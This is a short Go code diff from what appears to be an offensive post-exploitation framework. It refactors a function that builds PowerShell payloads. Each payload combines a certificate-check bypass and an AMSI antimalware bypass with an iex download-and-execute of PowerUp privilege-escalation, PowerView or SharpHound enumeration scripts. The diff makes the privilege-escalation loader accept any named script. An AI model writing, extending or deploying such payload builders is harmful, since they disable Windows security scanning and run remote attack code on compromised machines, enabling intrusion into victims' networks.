@@ -17,19 +17,19 @@ func HandleModules(command string) string {
 
 	switch module {
 	case "PowerUp":
-		payload += CertificateBypass + amsi() + "; " + powerUp()
+		payload += CertificateBypass + amsi() + "; " + localPrivEsc(module)
 		return payload
 	case "PowerView":
-		payload += CertificateBypass + amsi() + "; " + domainEnum("PowerView")
+		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
 		return payload
 	case "PowerView_dev":
-		payload += CertificateBypass + amsi() + "; " + domainEnum("PowerView_dev")
+		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
 		return payload
 	case "PowerView_2022":
-		payload += CertificateBypass + amsi() + "; " + domainEnum("PowerView_2022")
+		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
 		return payload
 	case "SharpHound":
-		payload += CertificateBypass + amsi() + "; " + domainEnum("SharpHound")
+		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
 		return payload
 	default:
 		//
@@ -47,8 +47,8 @@ func domainEnum(payload string) string {
 	return url
 }
 
-func powerUp() string {
-	url := iex("Local_PrivEsc/PowerUp.ps1")
+func localPrivEsc(payload string) string {
+	url := iex(fmt.Sprintf("Local_PrivEsc/%s.ps1", payload))
 	return url
 }
 
